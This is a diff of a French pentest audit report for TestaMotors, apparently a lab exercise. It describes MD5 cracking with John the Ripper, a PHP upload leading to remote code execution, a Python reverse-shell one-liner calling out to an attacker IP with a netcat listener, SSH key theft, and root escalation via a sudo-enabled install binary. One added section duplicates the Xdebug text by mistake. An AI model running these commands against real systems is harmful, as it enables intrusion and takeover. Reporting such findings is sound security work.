@@ -1,9 +1,14 @@
-# Rapport d'Audit de Pentest
+# Rapport d'Audit
+
+## A l'attention de TestaMotors
+
 ![Alt text](img/logo.png "logo OCD")
 
 Auteur : **Hallez Arthur**
 
 Contact : **arthur.hallez.59930@gmail.com**
+
+Version : 2.0
 
 Fait le **07/06/2024**
 
@@ -17,6 +22,8 @@ Fait le **07/06/2024**
         - [Injection SQL](#injection-sql)
         - [Répertoires Sensibles Exposés](#répertoires-sensibles-exposés)
         - [Xdebug PHP](#xdebug)
+        - [Formulaire d'upload permissif](#upload-permissif)
+        - [Binaire executer avec les droits root](#binaire)
     - [Vulnérabilités Moyennes](#vulnérabilités-moyennes)
         - [Algorithmes de Hachage Dépassés](#algorithmes-de-hachage-dépassés)
     - [Vulnérabilités Faibles](#vulnérabilités-faibles)
@@ -119,19 +126,17 @@ En regardant dans le code source de la page web, nous nous sommes apercu qu'un f
 ![Alt text](img/loginAdm.png "Hash de mot de passe")
 
 
-
-
-
 ##### Craquage de Mot de Passe
 
 Après avoir récupéré ces informations, nous pouvons lancer l'outil `John the Ripper` pour essayer de brute force le mot de passe.
 
-cependant, le hash étant assez commun, nous avions besoin de trouver le format de celui-ci.
+Cependant, le hash étant assez commun, nous avions besoin de trouver le format de celui-ci afin de tenter une attaque par dictionnaire.
 
-C'est pour cela que nous avons parcouru le code source à la recherche de l'algorithme utilisé, en l'occurence le MD5
+C'est pour cela que nous avons parcouru le code source à la recherche de l'algorithme utilisé, en l'occurence le MD5 : 
 
 ![Alt text](img/hashtypePassword.png "Type Hash")
-une fois toute les informations en notre possession nous avons pu très rapidement obtenir le mot de passe de l'utilisateur en utilisant la commande suivante : 
+
+Une fois toute les informations en notre possession nous avons pu très rapidement obtenir le mot de passe de l'utilisateur en utilisant la commande suivante : 
 
 `john hashAdmin.txt --format=Raw-MD5`
 
@@ -149,33 +154,38 @@ Nous avons donc essayé d'uploader un fichier .php qui contenait uniquement la f
 
 Une fois cela vérifié, nous devons trouver le chemin vers le fichier uploadé sur le site. Dans l'onglet Cars, nous pouvons voir apparaître l'image d'une voiture.
 
-`http://35.180.243.34/admin/assets/uploads/xxx.png`
-
  Nous avons donc copié l'URL de l'image et remplacé le nom de l'image par le nom de notre fichier.
 
-Nous avons également remarqué dans le code source php du site que le nom du fichier était horodaté.
+ Cependant nous nous obtenus une erreur 404. Après analyse du code source nous avons decelé une fonction nommée `save_settings()` détaillant la logique lié a l'upload
 
-![Alt text](img/2024-06-08_08-12.png "Horodatage fichier")
+ ![Alt text](img/2024-06-08_08-12.png "Horodatage fichier")
 
-Avec toutes ces informations, nous pouvons tenter d'accéder au fichier envoyé.
+
+Après avoir compris que le fichier était horodaté nous avons tenter d'acceder de nouveau a notre fichier : 
 
 ![Alt text](img/AccèesInfo.php.png "Vérification interprétation")
 
+Cette fois ci le phpinfo est bien trouvé et executer par le serveur.
+
 ##### Exploitation des Uploads de Fichier
 
-Après avoir effectué cette vérification, nous pouvons injecter un fichier php malveillant qui nous permet d'envoyer des commandes au serveur.
+Après avoir effectué cette vérification, nous pouvons injecter un fichier `php` malveillant qui nous permet d'envoyer des commandes au serveur.
 
-J'ai commencé par vérifier la présence d'utilitaires me permettant d'avoir un reverse shell. Nous avons aperçu grâce à la commande `which` que l'utilitaire python3 était sur le serveur. Nous avons alors utilisé ce payload pour initier notre reverse shell.
+Nous avons commencé par vérifier la présence d'utilitaires me permettant d'avoir un reverse shell. Nous avons aperçu grâce à la commande `which` que l'utilitaire python3 était sur le serveur. Nous avons alors utilisé le payload suivant pour initier notre reverse shell.
+
+`export RHOST="172.32.1.218";export RPORT=1234;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")`
+
+et la commande suivante pour créer un serveur d'ecoute sur la machine nommé `ip-172-32-1-218`: `nc -lvnp 1234`
 
 ![Alt text](img/RCE.png "RCE")
 
 ##### Récupération d'une Connexion Utilisateur
 
-Une fois mon shell récupéré en tant que www-data, nous avons lancé le script `linpeas` qui permet de faire ressortir les potentielles failles d'escalade de privilèges.
+Une fois le reverse shell obtenus en tant que www-data, nous avons lancé le script `linpeas` qui permet de faire ressortir les potentielles failles d'escalade de privilèges.
 
 ![Alt text](img/linpeas.png "linpeas www-data")
 
-Celui-ci nous a permis de découvrir un dossier compressé intéressant dans le home de l'utilisateur testa. Ce dossier est `.ssh-backup.tar.gz`.
+Celui-ci nous a permis de découvrir un dossier compressé intéressant dans le repertoire principale de l'utilisateur testa. Ce dossier est `/home/testa/.ssh-backup.tar.gz`.
 
 ![Alt text](img/2024-06-08_08-37.png "Dossier Compressé")
 
@@ -185,7 +195,14 @@ Pour voir son contenu, nous avons dû le télécharger car nous n'avions pas les
 
 ![Alt text](img/fichier.png "Dossier local")
 
-Une fois en local, nous avons pu voir son contenu et avons trouvé la clé RSA de l'utilisateur testa, ce qui nous a permis de nous connecter en ssh sur le serveur.
+Une fois en local, nous avons pu voir son contenu par le biais des commande suivantes
+
+```
+gzip -d ssh-backup.tar.gz
+tar xvf ssh-backup.tar
+```
+ 
+ Nous avons trouvé la clé RSA de l'utilisateur testa, ce qui nous a permis de nous connecter en ssh sur le serveur : 
 
 ![Alt text](img/ssh.png "connexion ssh")
 
@@ -193,32 +210,30 @@ Une fois en local, nous avons pu voir son contenu et avons trouvé la clé RSA d
 
 Une fois connectés avec l'utilisateur testa, nous avons relancé le script `linpeas`. Celui-ci nous a remonté plusieurs informations intéressantes.
 
-Pour commencer, celui-ci nous remonte la potentielle utilisation de CVE pour passer root sur le serveur.
+Pour commencer, celui-ci nous récuperer une liste de CVE lié a de l'exploitation kernal.
 
 [Alt text](img/linpeasuser.png "CVE linpeas")
 
-Nous n'avons pas suivi cette piste, car il nous a remonté une autre faille.
+Linpeas nous a également obtenus une information importante concernant un binaire nommé `install` disponible dans le chemin `/usr/bin/`. En effet ce binaire a la possibilité d'etre executer avec les privileges superutilisateur sur la machine.
 
 ![Alt text](img/pistesudo.png "Linpeas binaire mal conf")
-
-Le binaire sudo était mal configuré et nous permettait de lancer le binaire /usr/bin/install sans mot de passe et avec les droits superutilisateur.
 
 Pour l'exploiter, il nous faut créer un fichier contenant un script exécutant un reverse shell.
 ![Alt text](img/Root.png "Requête Post")
 
 Nous devons ensuite utiliser le binaire install
 
-`
+```
 LFILE=file_to_change
 TF=$(mktemp)
 sudo install -m 6777 $LFILE $TF
-`
+```
 
 ![Alt text](img/ygegqfd.png "Exploitation")
 
 #### Piste non exploré
 
-le scan `nuclei` Nous montre un fichier xdebug.php
+le scan `nuclei` Nous montre la présence du xdebug, cette piste aurait également pu nous mener a l'obtention d'un shell sur la victime.
 
 ![Alt text](img/2024-06-08_10-01.png "Nuclei xdebug")
 
@@ -226,12 +241,12 @@ le scan `nuclei` Nous montre un fichier xdebug.php
 
 - **Nmap** : Pour scanner les ports et services ouverts.
 - **Burp Suite** : Pour analyser les applications web.
-- **gobuster** : Pour découvrir des répertoires et fichiers cachés.
+- **Gobuster** : Pour découvrir des répertoires et fichiers cachés.
 - **Nuclei** : Pour decouvrir des potentielle faille sur l'application web
 - **SQLmap** : Pour détecter et exploiter les injections SQL.
 - **John the Ripper** : Pour craquer les mots de passe hachés.
 - **SSH** : Pour accéder au serveur.
-- **linPEAS** : Pour identifier des escalade de privilèges.
+- **LinPEAS** : Pour identifier des escalade de privilèges.
 
 ---
 
@@ -292,6 +307,16 @@ Voici la liste des points à vérifier :
 
 
 #### Session Xdebug
+
+**Description :** Une session Xdebug est ouverte sur le serveur. Il est possible pour un utilisateur de récupérer un reverse shell.
+
+**Preuve :**
+![Screen des secrets](img/2024-06-08_10-01.png "Screen des secrets")
+
+**Remédiation :**
+Désactivation de Xdebug en production, verifiez la configuration du fichier `php.ini`
+
+#### Upload de fichier permisif
 
 **Description :** Une session Xdebug est ouverte sur le serveur. Il est possible pour un utilisateur de récupérer un reverse shell.
 
